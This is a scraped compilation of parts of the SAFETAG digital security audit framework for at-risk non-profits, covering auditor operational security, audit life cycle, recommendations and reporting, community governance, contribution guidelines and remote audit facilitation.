Below are some baseline operational security guidelines for a SAFETAG audit. Activity-specific operational security guidelines are contained within each activity.\n\n### Purpose\n\nAn audit uncovers an array of sensitive information about an organization. For some at-risk populations the mere act of getting a digital security audit can increase their likelihood of being actively attacked by an adversary. The foundation of the SAFETAG process is the goal of increasing the safety of the host organization, its staff, and the auditor. It is vital that an auditor weigh the possible risk an audit may incur on the organization or the auditor against the possible benefits of the audit. In other words, there may be circumstances where carrying out an audit could introduce such levels of risk to the organization or the auditor that that a no-go decision must be made.\n\n### Approaches\n\n**Data storage and data transit security**\n\n* Keep ALL data related to the assessment secured and compartmentalized, from interview and research notes through audit findings and reporting outputs. Auditors should note where tools (such as OpenVAS or recon-ng) store their internal data. Practically speaking, LUKS or VeraCrypt volumes are useful, secure, and portable. The auditor should modify their data storage approach based on threat information from their context research.\n* Consider what secure storage options the organization will need to have in place to store the final report and findings documents.\n* Consider if the raw data may be at risk during transit post-audit and plan mitigations in advance of travel (e.g. completing the report on-site or uploading to a secure remote server and securely deleting all data locally).\n* Refer back to the agreement established with the organization.\n\n**Communications security**\n\n* Conduct all communication with the client over at least minimally secure channels where the communication is encrypted in transit at all times. Consider risks to the organization and the auditor(s) if the organization is actively compromised.\n* Higher levels of security with end-to-end guarantees (such as Signal, Wire, PGP, or Veracrypt) should be used for file and document transfers.\n* Training and support may be required to ensure the organization is able to reliably and securely receive such communications.\n\n**Data Deletion**\n\n* When assessment data is to be destroyed (by the auditor or organization), ensure secure data deletion processes are followed.\n\n### Resources\n\n* *Standard*: [NIST SP 800-115, Technical Guide to Information Security Testing and Assessment](http://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-115.pdf) (Section 7.4)\n* *Standard*: [Pentest Standards for data security](http://www.pentest-standard.org/index.php/Pre-engagement#PGP_and_Other_Alternatives)\n* *Guide*: [Surveillance Self Defense](https://ssd.eff.org/) (cross-platform guides for WhatsApp, Signal, PGP, and OTR secure communications)\n* *Guide*: [Security in a box: Secure File Storage](https://securityinabox.org/en/guide/secure-file-storage/)\n"},"base":"operational-security-during-an-audit.md"}},{"node":{"childMarkdownRemark":{"rawMarkdownBody":"The Security Auditing Framework and Evaluation Template for Advocacy Groups (SAFETAG) is a professional audit framework that adapts traditional penetration testing and risk assessment methodologies to be relevant to small and medium, non-profit, human rights organizations based or operating in the developing world, taking into account the capacity constraints and unique threats faced in this community.\n\nSAFETAG uses assessment activities derived from standards in the security auditing world and best-practices for working with small scale at-risk organizations to provide organization-driven risk assessment and mitigation consultation. SAFETAG auditors lead an organizational risk modelling process that helps staff and leadership take an institutional lens on their digital security problems, conduct a targeted digital security audit to expose vulnerabilities that impact the vital processes and assets identified, and provide post-audit reporting and follow-up that helps the organization and staff identify the training and technical support that they need to address needs identified in the audit.\n\ninfo@safetag.org | https://safetag.org\n\n## The SAFETAG Audit Framework Core\n\nThe SAFETAG audit consists of multiple information gathering and confirmations steps as well as research and capacity-building exercises with staff. These are organized in a collection of objectives, each of which supports the core goals of SAFETAG: creating an information security risk assessment while simultaneously building the capacity of the organization to manage its risk.\n\nThese objectives provide collections of approaches and activities to gather and verify information in both technical and interactive/social methods and to assess and build capacity. Many of these activities include targeted exercises and walk-through instructions.\n\nThese are not meant to be a \"checklist\" or even a prescribed set of actions -- indeed, experienced auditors will deviate strongly from many of the specific activities. SAFETAG  provides only a library of activities which auditors can draw from, as well as guidance on what a \"minimal set\" of audit activities would entail.\n\nIndeed, many objectives and their specific exercises overlap or can be done together -- on-site interviews with staff can coincide with assessing their devices and keeping one's eyes open for physical security issues. Conversely, the data assessment exercises may provide enough information that other staff engagements are unnecessary.\n\n## The Life Cycle of an Audit\n\nSAFETAG consists of a collection of high-level Methodologies, each with a variety of linked activities, that contribute towards the goals and their required information needs is represented here. Activites tend to fall in three broad approaches: Technical, Research, and Interpersonal. It is tempting to focus on the style of approach you as the auditor are most comfortable with - people with backgrounds in digital security training tend towards the interpersonal, people with pentesting backgrounds the technical. However, by using a combination of these, you get a clearer understanding of not only the organization’s setup and infrastructure, but how decisions are made, how policies are enforced (or not), and where there are opportunities for organizational change. Experienced Auditors will likely come up with their own approaches, and the SAFETAG project welcomes such contributions.  \n\nThe audit process is very cyclical. Assessment activities reveal new threats, vulnerabilities, capabilities, and barriers which in turn shed new light on activities that have already been and have yet to be run. At the same time the auditor, through conversations, training, and group activities is actively building the organization's agency and addressing time-sensitive or critical threats insofar as possible within the time frame. This iterative process eventually leads to a point where the auditor is confident they have identified the critical and low-hanging fruit, and is confident the organization is capable of moving forward with their recommendations.\n\nEach objective requires a certain base of information, and outputs more information into this cyclical process.  Each objective has a \"map\" of the data flow that it and its specific activities provide:\n\n![SAFETAG Data Flow](/img/data_flow_all.png)\n\n* **Actors** are the people connected to an organization including an organization's staff, board members, contractors, and partners.  Actors could also include volunteers, members of a broader community of practice, and even the family members of principle actors. Actors also include potential adversaries of the organization such as competing groups.\n* **Activities** are the actions and processes of an organization.  While most NGO work revolves around program-based concepts, activities also include things like payroll.\n* **Capacity** includes staff skills and a wide variety of resources that an organization can draw from to affect change including funding, networks, and institutional processes and policies.\n* **Barriers** are specific challenges an organization faces that might limit or block its capacity.\n* **Assets** are most easily conceptualized as computer systems - laptops and servers, but also include both the data stored on them and can also be services like remote file storage, hosted websites, applications, webmail, and more.  Offline drives, USB sticks, and even paper records containing sensitive information are also assets.\n* **Vulnerabilities** are specific flaws or attributes of an asset susceptible to attack.\n* **Threats** are specific, possible attacks or occurrences that could harm the organization.\n\nIf a bucket of oily rags is a **vulnerability**, a fire is the **threat**.  **Mitigations** would be rules against leaving oily rags around as well as fire extinguishers, smoke detectors, remote backup policies, and evacuation planning. Note that some mitigations may be outside the **capacity** of an organization -- perhaps there is limited budget (a **barrier**)  for one fire extinguisher or one smoke detector, but not both. **Vulnerability** can be reduced by implementing mitigating strategies for the assets at highest risk of combustion or smoke damage. The auditor will need to work with the organization to review **assets**, **activities**, and **actors** as well as a detailed review of the **threats** to determine the organization's response.\n\nThese components are defined in greater depth in the Risk Assessment and Agency Building sections to follow."},"base":"section_1.md"}},{"node":{"childMarkdownRemark":{"rawMarkdownBody":"\n# Reporting\n\n## Recommendation Development\n\n### Summary\n\nIn this component the auditor identifies the organization's strengths and weakness (expertise, finance, willingness to learn, staff time, etc.) to adopting new digital and physical security practices and documents the possible actions the organization could take on to address the vulnerabilities found during the audit, the difficulty of taking on those actions, and the resources that the host may be able to leverage to address them. Resources can include, but are not limited to, local technical support and incident response groups/trade organizations, places to obtain discount software, trainers, and guides/resrouces they can use to support their up-skilling.\n\n### Purpose\n\nThe host needs to be able to take action after an audit. The recommendations that an auditor provides to address vulnerabilities must cover a range that allows an organization to address them in both the short-term and more comprehensively in the long-term. Knowing an organization's strengths and weaknesses will allow the auditor to provide more tailored recommendations that an organization will be more likely to attempt and achieve. In doing this the SAFETAG auditor has an opportunity to act as a trusted conduit between civil society organizations in need and organizations providing digital security training, technological support, legal assistance, and incident response.\n\n### Guiding Questions\n\n* What are the organizational areas of strength  (expertise, finance,\n  willingness to learn, staff time, etc.) that the organization can leverage\n  when engaging in technological adoption/change?\n* What are the organizational areas of weakness  (expertise, finance,\n  willingness to learn, staff time, etc.) that need to be taken into\n  consideration when engaging in technological adoption/change?\n* What are the organizational barriers to adoption?\n* Are the recommendations you are providing directly related to the security\n  audit? If not, do they support the organization in accomplishing their\n  security tasks, or distract from them?\n\n### Approaches\n\n* **Identify and Explain Un-Addressed Concerns :** Write explanations for why any adversaries or threats that the auditor identifies as \"un-addressable\" with the organizations current capacity.\n* **Identify Recommendations:** Identify possible actions to address each vulnerability.\n* **Identify Useful Resources:** Identify resources that the organization can leverage to accomplish the identified recommendations.\n\n### Outputs\n\n* Short-term recommendations to address each vulnerability.\n* Long-term recommendations to address each vulnerability.\n* Summaries of why recommendations were not given for any vulnerabilities or adversaries.\n* Lists of organizations that can assist the host accomplish their task.\n* Lists of educational resources the organization can use for training.\n* Contact information for recommended trainers who can help with digital security training.\n\n### Operation Security\n\n* Treat the data and analyses of this step with the utmost security.\n* Use VPNs or Tor to search if conducting the search from a country that is highly competitive with the organization's country, or is known to surveil.\n* Do not share any organization information or data when reaching out to possible resources.\n\n### Resources\n\n####

The auditor prioritizes vulnerabilities, weighs the implementation costs of recommendations and then creates an actionable roadmap for the organization to make their own informed choices about possible next steps as they move forward.\n\n### Purpose\n\nAs part of SAFETAG's dedication to building agency and supporting organizational adoption of safer practices, a careful prioritization of vulnerabilities is invaluable in keeping audit results from appearing overwhelming. An organization needs to be able to weigh their possible paths forward against the time lost from program activities, the cost to implement the threat, and the other threats that they are not addressing. Roadmapping is used to give the host the tools to make these decisions and provide them with a recommended path forward that will allow them to make immediate gains towards protecting themselves. The existing in/formal security practices captured during this process will be used to remove organizational and psyco-social barriers to starting new practices.\n\n### Baseline Skills\n\n### Preparation\n\n### Materials Needed\n\n### Approach\n\n### Outputs\n\n* A risk matrix with all vulnerabilities ranked on it.\n* An \"implementation matrix\" showing each recommendation in relation to its difficulty to implement and its urgency.\n* An overview of the risks the organization is accepting until they address each vulnerability.\n* A short overview of the how the likelihood was determined for vulnerabilities.\n* A listing of the process, impact, and likelihood for each vulnerability.\n* A roadmap for a \"recommended path\" to address the threats the host faces.\n* A short description of why a recommendation (and corresponding threat) was ranked with the urgency it was assigned.\n\n### Operational Security\n\n* Treat the data and analyses of this step with the utmost security.\n* The roadmap may be shared with local IT support, digital security trainers, possible funders, or other consultants in part, or in full. Consider the content in light of this.\n\n  * Individual vulnerabilities should be able to be read, and acted upon, independently from the rest of the report so that the organization can easily provide only the required information for follow up work.\n  * The overall posture and risk/ranking profile components should be able to be read independent from the risk model and be free of any specific vulnerabilities to allow the organization to easily provide trusted invested parties with an overview of the results/need without exposing any specific vulnerabilities.\n* Use VPNs or Tor to search if conducting the search from a country that is highly competitive with the organization’s country, or is known to surveil.\n\n### Resources\n\n* *Guide:* [\"Risk Thresholds in Humanitarian Assistance\"](https://www.eisf.eu/wp-content/uploads/2014/09/0593-EISF-2010-Risk-Thresholds-in-Humanitarian-Assistance.pdf) (eisf)\n* *Guide:* [\"Guide to Security Management Planning\"](https://www.eisf.eu/library/guide-to-security-management-planning/) (eisf)\n* *Guide:* [\"Developing a Security-Awareness Culture - Improving Security Decision Making\"](https://www.eisf.eu/wp-content/uploads/2014/09/0241-Garrett-2005-Security-awareness-culture.pdf) (SANS InfoSec Reading Room)\n* *Book:* \"The Order of Mitigation - p. 131\" (Threat Modeling - Adam Shostack)[91](https://safetag.org/guide/#fn91)\n\n## Report Creation\n\n\"*A good analysis might turn the threats into stories so they stay close to mind as software is being written or reviewed.

If written with care it can be a tool to encourage agency and guide adoption. The report has many audiences who will need to use it in different ways. For the auditor and the organization, it acts as documentation of what an auditor accomplished. For the organization, it will be guide for connecting vulnerabilities to actual risks, a rallying cry for change, and proof of need for funders. For those the organization brings in to support their digital security, it provides a roadmap towards that implementation and a task-list for future technologists and trainers paid to get the host there - as well as a checklist for validating that threats have been addressed.\n\n### Baseline Skills\n\n### Preparation\n\n### Materials Needed\n\n### Approach\n\n* Create charts and visuals for roadmap, risk-matrix, implementation matrix, and critical processes.\n* Compile approaches, impact, risk, recommendations and resources for each vulnerability.\n* Prepare narrative components.\n* Write explanations for why any adversaries or threats that the auditor identifies as \"un-addressable\" with the organizations current capacity.\n* Collect agreements & scope.\n* Document tools used for testing where needed.\n* Update glossary where needed.\n* Compile full report contents.\n* Send the report to client.

There will be an annual \"introduction\" thread on the listserv where all SCoP members are expected to respond with a short note on current (shareable) activities.\n* Some SCoP members may have privacy concerns, and should join the community using a pseudonym they are comfortable with engaging online in both public and private spaces with.\n* Joining the community: While housed within the orgsec.community, the SCoP will follow the joining process on that list.\n* The SCoP is responsible for adhering to the SAFETAG Code of Conduct, below\n\n#### SAFETAG Code of Conduct\n\nMembers of the SAFETAG community are expected to:\n\n* Respect the auditees, their contexts (including the legal framework they operate within), and protect their privacy and security\n* Protect the identifying information and audit findings of your auditees, unless you have full, informed consent of the auditee -- and even then, exercise extreme care.\n* Never use your knowledge, skills and/or access to do harm against organizations or communities you are working with or your peer auditors through malice or neglect\n* Minimize any conflict of interests through transparency in your contracting, reporting, and recommendations; e.g. if you were not hired initially to implement recommendations, suggest options other than yourself for implementation, and provide reporting that would enable that to be a success in every case.\n* Perform your job responsibly and well. Ask and consult with fellow members of the community.\n* Respect other members of the community as peers and promote a safe, inclusive, and harassment-free environment\n\n#### Community Manager\n\nThere will be, given that funds are available, a paid **community manager** who has at least a quarter of their time to support the SAFETAG community and contribute to and support the broader community around NGO organizational security.  This community manager should rotate among organizations implementing substantial organizational security work. There may be gaps and/or overlaps due to project and staff funding requirements; it is important for implementing organizations to coordinate funding this position in order to minimize this.\n\nThe CM's role is to cultivate, support, and grow the community.  This includes, but is not limited to:\n\n* Proposing, planning, and facilitating discussions to support a vibrant and active community\n* To a reasonable degree and avoiding conflicts of interest, supporting and coordinating fundraising work across the community\n* Providing transparency to the work being done across the implementing community, including the sharing of any requests for audits.\n* Shepherding and supporting the creation of new content (managing peer review, managing pull requests, providing guidance and direct support on merging content into the SAFETAG architecture)\n* Supporting the ongoing development of the SAFETAG mission, vision, code of conduct, licensing, and related \"meta\" content.\n* Managing the technical infrastructure (website, content repository)\n* Providing at least quarterly reports to the community summarizing activity such as new content, supporting tools or interfaces, new opportunities, and new members\n* Scheduling and joining Advisory Board meetings to participate as well as take notes as relevant.\n* Documenting the activities, duties, and challenges for future community managers.\n\n### The Advisory Board\n\n#### Structure\n\n* An **Advisory Board** of no more than 10 and no fewer than 3 persons shall be made of individuals and institutional representatives, nominated by the board.\n* Board members are to serve 18 month terms; 2 consecutive term limit. Institutions are not term limited, but are encouraged to change their representation to the Board when representatives have served two consecutive terms, and are expected to step down if they are unable to continue contributions defined below.\n* There can be up to four institutional members of the board, representing organisations that have a vested interest in SAFETAG, due to using it extensively in their own programs. Institutions should designate a representative with a relevant program role and experience with organizational security. Institutional members of the Board are expected to significantly contribute, through funding the community manager, significant content contributions, infrastructure or activities.\n* Board members, including institutions, will be appointed and dismissed by simple majority of votes cast by board members with a voting window of two weeks.\n* Board meetings over calls or in person ought to be minuted, the board chair is responsible for identifying a note taker.\n* Board members who do not participate in voting processes and fail to join 2 consecutive board calls without excusing themselves in advance to the board are automatically removed from the board and trigger the voting in of a new member\n\n#### Responsibilities\n\n* The Board is responsible for the stewardship of the SAFETAG framework and supporting and advising the CM.\n* The Board is responsible for ensuring that the responsibilities of a CM are performed, whether completely by the CM, by a combination of CM and Board members, or by Board members during gaps in the CM role, as well as measuring the performance of the CM\n* The Board will be responsible for proposing changes to these governance rules, through simple majority voting\n* All members of the Board will provide an ombudsman service to sensitively manage ethics concerns regarding the community manager, fellow board members, and usage of the SAFETAG framework and trademark more broadly\n\n### Contact\n\nFor SAFETAG content related questions, please file an issue: https://github.com/SAFETAG/SAFETAG/issues\nYou can email the SAFETAG Advisory Board at AdvisoryBoard at safetag.org\n\n\n## APPENDIX: How to contribute to SAFETAG\n\n### Contributing to SAFETAG\n\nSAFETAG welcomes contributions!\n\nSAFETAG is a community-managed product with an advisory board and community management roles laid out in our [Code of Conduct][code-of-conduct]. The Code of Conduct further outlines expectations of not only those using the content herein but also those contributing to it. By participating, you are expected to uphold this code.\n\nWhen submitting new content, please write in clear, concise, and gender neutral language. This document will be updated with guidance on content translation once we have settled on a process for that. If you would like to submit content in a language other than English, Spanish, Arabic, or Russian - please open an issue to set that language up for submission.\n\n### Getting Starting\n\nBefore you start work, it is critically important to review the current content and existing [issues][issues] and **create a new issue for your proposed work** to solicit feedback -- this will save you a lot of time as the SAFETAG community can help refine your idea and advise on where best to include it in the framework (is it a new method? An activity or variant? Is there existing content in SAFETAG to update or improve?), as well as suggest additional resources worth considering, operational security and safety considerations.\n\nYou can also join the [public slack](https://join.slack.com/t/humansafetag/) to discuss changes and ask questions to the community.\n\n### Content Creation Guidelines\n\n*This section helps walk you though how SAFETAG is constructed, and what pieces of content are important to provide in a submission. Submissions which do not follow these guidelines will take significantly longer to be incorporated.*\n\nSAFETAG has currently three main compiled products - an **overview guide**, the **full guide**, and a **curricula** to help train new auditors.  This guide is primarily focused on the non-curricular SAFTAG content. The Curricula is an ADIDS-based approach to training on SAFETAG content (read more about the curricula content at [https://github.com/SAFETAG/SAFETAG/wiki/Curricula-Document-Template](https://github.com/SAFETAG/SAFETAG/wiki/Curricula-Document-Template)\n\nThe SAFETAG overview is the easiest place to start. The full guide is a comprehensive collection of not only the method-based objectives of the audit, but a variety of specific activities an auditor might choose to use and combine to achieve those. Both of these are built from the collection of Methods and Activities that make up SAFETAG.\n\nGenerally speaking, **Methods** are high-level, goal-focused aspects of the assessment.  There are inevitable \"fuzzy\" borders between some methods. Creation of new methods should be minimized to not overly complicate the scope of SAFETAG.\n\n**Activities** are the meat of an audit, and answer \"how\" and \"where\" type questions.  To accomplish the goals of a method, one might conduct multiple activities to explore and verify organization practices from different angles - research, policy review, conversations / discussions, and technical verification, exploration, and scanning.\n\nWithin both Methods and Activities are smaller chunks of content which are used across the full range of SAFETAG \"products.\" The tables below map out what content chunks exist across which products, and what they are. The [Templates](https://github.com/SAFETAG/SAFETAG/tree/master/en/templates) folder has sub-folders which provide the default files and indices for methods and activities.\n\n#### Language Guide\n\nAlthough SAFETAG contributors and users come from around the world, adherence to a single style guide and linguistic conventions will improve the readability and cohesion of SAFETAG as a resource.\n\n* The English version of SAFETAG defaults to being written in American English (_Organization_, not _Organisation_). Please note that this will not block contributions.\n* Use the Oxford Comma (_Interview management, staff, and volunteers_)\n\n### Creating a new SAFETAG Method\n\n* Follow the Getting Started instructions above.\n* Decide on a name for the method, and create the a corresponding folder (lowercased, with _ replacing spaces). If your new method is \"Creating SAFETAG Content\", the folder would be *en/methods/creating_safetag_content*.\n* Copy the Method [template](https://github.com/SAFETAG/SAFETAG/tree/master/en/templates) files from [https://github.com/SAFETAG/SAFETAG/tree/master/en/templates/folders/method](https://github.com/SAFETAG/SAFETAG/tree/master/en/templates/folders/method) into the method folder. The content of these files is described below.\n* Create index files for your method: In addition to the content files below, each Method must also have two index files, a method_name.guide.md and a method_name.overview.md . The contents of these index files are generally the same for every method, and templates exist at [https://github.com/SAFETAG/SAFETAG/tree/master/en/templates/folders](https://github.com/SAFETAG/SAFETAG/tree/master/en/templates/folders) .\n\n**New methods must be linked into the master index file, and must have activities linked to them.** To link the new method into the master index file (and therefore have the method \"included\" in the \"master\" SAFETAG build, these index files must be linked into the relevant master index file in the language folder (*en/index.guide.md* and *en/index.overview.md*).  See below for how Activities are linked in to the methods.\n\n#### Method Content notes:\n\n* Try to focus on creating Activities rather than Methods.\n* All Methods must have all of the content listed below unless marked as \"optional\".\n* All Methods must have at least one activity associated with them.\n* Ideally, also create curricula content for each Method, or at least notes for someone training on the topic.\n\n#### Method Section and Stylistic notes:\n\n* Methods should operate at header 2 and 3.  The Method title is h2, and the major subheadings (below) are h3.  No additional header levels should be used.\n* The Flow of Information graphics live in *en/images/info_flows* and follow the *method_name.svg* naming convention.\n\n| Section|ADIDS|Guide|Overview|Definition|\n|--|-|-|-|---------------------------------------------------------------------|\n| Quote|-|-|-|OPTIONAL: No longer included in the compiled guides, but an introductory / framing quote for the section|\n| Summary|-|+|+|A short - two to three sentence - basic overview of the methodology -- What is the auditor doing , what are the high-level outputs and processes?|\n| Purpose|+|+|+|The justification for why this methodology is used -- Why is this collection of activities being pursued? what is the end goal?|\n| Information Flow|-|+|+|The \"Flow of Information\" shows the types of information that an audit activity builds upon (input), and the types of information that an audit activity may reveal (outcomes). As this information is acquired, earlier audit will have to be re-visited based upon this information --  What are the inputs which feed in to this, and what outputs are possible/expected? Modify the Information Flow diagram in images/info_flows|\n| Guiding Questions|+|+|+|Each audit activity is guided by a small set of core questions. Key questions are included to help an auditor identify when they have acquired enough information and customize their approach while still collecting the correct types of information to support the organization -- What are specific guiding or research questions to be answered by conducting activities in pursuit of the larger goal?|\n| Outputs|-|+|-|The data or impact is expected from this method -- What are specific outputs to aim for? These should further clarify the information flow diagram above.|\n| Operational Security|-|+|+|OPTIONAL: Operational Security considerations -- Does pursuing this objective have any broad operational security challenges to be aware of that is not otherwise captured in the per-activity detail?|\n| Preparation|-|+|-|OPTIONAL: Any preparation, skills, or materials needed for the method as a whole.  Individual exercises will specify this more exactly -- What must an auditor do to prepare for this work that is not otherwise captured in the per-activity detail?|\n| Approaches|-|+|+|No longer used - this was a high-level bullet list of potential activities; now specific activities should be refernced or created instead, and other relevant method-level content should be moved to other sections as relevant. |\n| Resources|-|+|-| Resources should include not only the research used in the creation of the method, but also recommended reading, references, and additional options for conducting this work -- What references did you use in creating this method?  Are there references which provide activity style walkthroughs or additional backgrounds? Are there existing collections of references (in the references folder) that an auditor should review when looking at this methodology.|\n| Activities|-|+|-|Many of these audit activities can be completed in multiple ways depending upon auditor skill and the organizational technical setup and capacity. Methods should include existing or new activities to carry out parts, or the whole, of the information collection for the method. Each method should have different types of approaches - some might be technical, some research, some interactive.  See \"Creating a New SAFETAG Activity\" -- What existing activities are useful to achieve the goal and specific output(s) listed? Do they represent? If creating a new method, often new activities will be needed to ensure the suggested approaches are \"filled in\".  Please note that Activities are separate documents linked in to the Methods|\n\n### Creating a new SAFETAG Activity\n\n* Follow the Getting Started instructions above.\n* Decide on a name for the activity, and create the a corresponding folder (lowercased, with _ replacing spaces). Activity contents live in the exercises folder under the language folder, so *en/exercise/exercise_name/...*).  If your new activity is \"Using atom to edit SAFETAG markdown files\", the folder would be something like *en/exercises/using_atom/* .\n* Copy the Activity [template][templates] files from [https://github.com/SAFETAG/SAFETAG/tree/master/en/templates/folders/activity](https://github.com/SAFETAG/SAFETAG/tree/master/en/templates/folders/activity) into the method folder. The content of these files is described below.\n* Activity contents also have an index file (within the same folder, not above it as with methods).  The index file needs to be updated with the title of the activity but is otherwise the same across most activities.\n\n**New activities must be linked to a method.** To link an activity to a method, add it directly to index.guide.md under the method. If adding an activity to multiple methods, select a primary method where it is the most relevant to that method's outputs, and for additional methods, link it in following this format:\n\n```\n <div class=\"boxtext\">\n #### Activity Title\n Covered in full in **Primary Method**\n </div>\n```\n\n#### Activity Content notes:\n\n* Try to focus on creating Activities rather than Methods.\n* All Activities must have all of the content listed below unless marked as \"optional\".\n* All Activities must be linked to at least one Method.\n* Ideally, also create curricula content for each Activity, or at least notes for someone training on the topic.\n\n**Note:** For activities where multiple different approaches could fulfill the exact same goals consider building **activity variants**, see below\n\n#### Activity Content and Stylistic notes:\n\n* Activities should operate at header 4 and below, the Activity title is h4, the major subheadings (below) are h5, so any headings within the content (most often used in the instructions/walkthrough file for variants) must only be at h6.\n\n| Section|ADIDS|Guide|Overview|Definition|\n|--|-|-|-|---------------------------------------------------------------------|\n| Summary|-|+|-|A concise description of the exercise. This describes the vulnerability of class of vulnerabilities (e.g. \"PHP is out of date\") and its overall impact -- What does this specific activity accomplish?|\n| Overview|-|+|-|A short, bulleted list that clarifies the general steps, especially for cases where the walkthrough is very complex or involves multiple or parallel processes.  Also included when only referencing an exercise from a method, instead of including the full exercise.|\n| Materials Needed|-|+|-|Optional; does this require specific software, hardware, or preparation?|\n| Considerations|-|+|-|Optional; Notes on safely carrying out the activity and protecting the data collected, as well as other challenges (psycho-social, legal, ethical) to be aware of -- Are there operational security concerns, or important baseline skills to master before undertaking this activity?|\n| Walkthrough|-|+|-|A multi-use guide with concise instructions for a skilled technologist to replicate or prove the vulnerability.  This is used in the SAFETAG curricula, by auditors needing to recall that random flag for that one command without going online, and for the organization's technical staff to verify that this vulnerability has been addressed. This should provide concise guidance at a peer level for the general steps an auditor should take, but should point to, not re-create existing documentation. For technical aspects, ideal walkthroughs should enable IT staff/contractors to follow along and verify fixes. For research activities, research methods and preferred resources should be provided, and for facilitative exercises, a clear explanation of the process and any tips or challenges should be explained.|\n| Variants|-|+|-|Parallel approaches which can be used for the same affect but might work better in different contexts. See below for when and how to use these |\n| Recommendations|-|+|-|Optional; Sample text of common recommendations for how to address vulnerabilities identified through this activity; e.g. \"Work with the webmaster to update PHP and/or migrate to a hosting system which manages this automatically...\") -- for activities which have common findings, provide stock language to assist in report creation|\n\nIn some cases, one activity will have many parallel ways to achieve the goal this is often the case with technical activities where there is a collection of similar tools all focused on the same overall outcome.  In cases like these, it is best to create *Activity Variants* instead of new activities.  This lets different auditors select and use tools and approaches they are most comfortable with, while still operating within the larger SAFETAG framework. **Add these as part of the Walkthrough section with a h6 title.**\n\n### Other SAFETAG Content\n\nThese sections operate at header level 1, and for the most part should be included in any custom creation of SAFETAG products.\n\n#### Front and Back Matter\n\nGenerally speaking, these sections won't be updated very often.\n\n| Section | ADIDS | Guide | Overview | Description |\n|--|-|-|-|---------------------------------------------------------------------|\n| Title Page | + | + | + | Can be customized for your needs, locally only |\n| License | + | + | + | Please do not change the License |\n| Introduction | - | + | + | Welcome language |\n| Overview | - | + | + | An overview of the SAFETAG approach and the audit life-cycle|\n| \"Metro\" Map | + | + | + | |\n| Risk Assessment | | + | + | |\n| Agency Building | | + | + | |\n| Operational Security | - | + | - | Overall operational security concerns for the assessment process |\n| Preparation | - | + | + | How to prepare to conduct an assessment |\n| Appendices | - | + | - | Including the Code of Conduct, How To Read this Guide, Contribution guidance, and more. |\n| Footnotes | - | + |+ | |\n\n\n\n### How to Contribute\n\n**We have developed easy to use *templates* for SAFETAG Methods and Activities you can use and submit with your issue or directly by using git.**\n\nThese can be found at *en/templates/method-template.md* and  *en/templates/activity-template.md*.\n\n#### Contributing using issues\n\nSubmit an [issues][issues] and include to the extent possible a complete version of the [templates][templates] as well as any context/background that could be helpful in understanding how this is intended to be used in SAFETAG.\n\n#### Contributing Using Git\n\nThis guide will not itself cover how to use git, but here are some helpful resources to start with:\n- [Super Basic Git Guide for Content Development](https://gist.github.com/joncamfield/9249d2442c5849335c9811b8b70e0bc6)\n- [Using Pull Requests](https://help.github.com/articles/using-pull-requests/)\n- [GitHub Help](https://help.github.com)\n\n0.

This supplements the Data Assessment, Process Mapping, and Threat Assessment exercises, enabling them to be conducted remotely.\n\nThis may not provide as deep results as in-person facilitation, but should provide adequate levels of expansion and verification of information needed, and even provide the secondary benefits in most cases of helping the organization build a shared understanding of its processes, risks, and riosk tolerances.\n\n##### Overview\nConducting digital security audit remotely requires great commitment from both auditor and the organization. It requires careful planning, scheduling, documentation and coordination from both parties.\n\nAs situations may arise during the course of the project, adherence to the activities indicated on the project plan is required. Constant communication and participation are the keys for a successful remote audit.\n\nAfter preparing the list in \"materials_needed\", you may first start selecting or combining different approaches in conducting remote audit.\n\nThere are four different approaches you can use, depending on what resources are available, the size and structure of the organization, and which activities you are trying to facilitate remotely. Is there someone that can help as an on-site facilitator? Are video conferences realistic (given bandwidth and cost)? How does the approach you use interact with existing organizational team structures?\n\n* **Approach 1: On-site facilitator**: This provides the most valuable interaction, but requires a person who can take on the facilitation role on-site, while the auditor is over video chat.  The facilitator does not have to be a technical person, but should be able to manage the session, making sure that it is as inclusive and as productive as possible. Accommodates more participants per session than Approach 3 per session.\n\n* **Approach 2, hybrid online/synchronous**: This can be used with a large group of participants where it is possible to meet over multiple sessions with enough time to collect and analyse responses in between.\n\n* **Approach 3, multiple small sessions**: Consists of multiple small full sessions over video chats, of no more than four participants at a time to assure inclusiveness. Suitable for medium to large groups where it is possible to conduct multiple small video chats.\n\n* **Approach 4, hybrid offline/surveys**: This leverages surveys and shorters calls or emails. It will provide less information overall, but can be used when it is not possible to meet in person, over video chat, or through a local facilitator.\n\nPlanning your audit:\n\n  - Number of staff (office based, remote)\n  - Schedule (Upcoming calendar events)\n  - Availability (Can be 30min to 1hour a day/individual or can be 1 hour for a group of 4-5)\n  - Communication method (Video, email, chat)\n\nDepending on which area you are auditing, you may decide on using mixed approaches during the course of the audit.\n\n\n\n\n\n\n\n\n\n\n##### Materials Needed\nIn preparation with the remote facilitation activity, the following materials and documentation should be considered.\n\n  * Communication Guidelines\n  * Approved communication applications and channels (including fallback communication channels)\n  * Questionnaire, survey forms, templates (categorized)\n  * Auditing tools: Remote Desktop applications, auditing software (Lynis, Belarc Advisor)\n  * Project planning tools (Online Gantt Chart, Task Management etc)\n\n\n\n\n##### Considerations\nRemote facilitation, if not done securely, can expose sensitive information from both the auditor and the organization. There are different ways to communicate and exchange information remotely. This can be by voice calls, emails, video conference, survey forms cloud storages and chat messages. Choose your tools based on ease of adoption for the organization, proven security, and open source, ideally audited code when possible.  \n\n##### Walkthrough\nSelecting the most suitable approach requires understanding of the capacity and personel structure of the organization, including their ability to support communication technologies, and the availability of someone that can assist in facilitation.\n\nAfter selecting the most suitable approach, auditor should make sure to prepare for remote facilitation:\n\n* Work with the organization point of contact to select the most suitable approach.\n* Schedule calls/meetings and/or discuss timelines for survey preparation, sending, and deadlines for input.\n* Prepare any material to be sent and distributed beforehand.\n* Coordinate (including perhaps training) with on-site facilitator if ny.\n* Prepare at least one fallback communication channel.\n* Test communication channels.\n\n###### Approach 1, on-site facilitator, with video chat auditor\n\nSuitable when there is a person that can take a facilitation role on-site. Facilitator does not have to be a technical person, but should be able to manage the session, making sure that it is as inclusive and as productive as possible. Accommodates more participants than Approach 3 per session. If the auditor is able to join remotely, this provides an ideal substitute.\n\n  * On-site facililtator assists in conducting the over all exercise, ensuring inclusion of all participants. Level of facilitator envolvement needs to be decided between the facilitator and auditor before the session, and if needed training may be provided to the facilitator\n  * Auditor follows along via video chat through the full exercise and discussion, and is able to contribute or ask follow-up questions as needed.\n  * Facilitator leads the session and managing note-taking, as well as secure sharing of notes post-session.\n  * Follow up sessions may be arranged with selected groups of staff.\n\n###### Approach 2, hybrid online/synchronous\nCan be used with large group of participants, where it is possible to meet over multiple sessions with enough time to collect and analyse 